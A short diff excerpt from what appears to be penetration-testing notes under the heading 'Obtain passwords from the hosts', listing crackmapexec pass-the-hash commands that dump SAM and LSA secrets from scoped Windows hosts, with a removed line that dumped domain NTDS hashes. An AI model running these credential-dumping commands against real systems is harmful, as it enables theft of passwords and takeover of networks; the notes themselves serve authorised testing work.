@@ -13,5 +13,4 @@ Obtain passwords from the hosts
 ```
 crackmapexec smb server_scope.txt -u administrator -H <hash> --local-auth --sam
 crackmapexec smb server_scope.txt -u administrator -H <hash> --local-auth --lsa
-crackmapexec smb server_scope.txt -u administrator -H <hash> --ntds
 ```
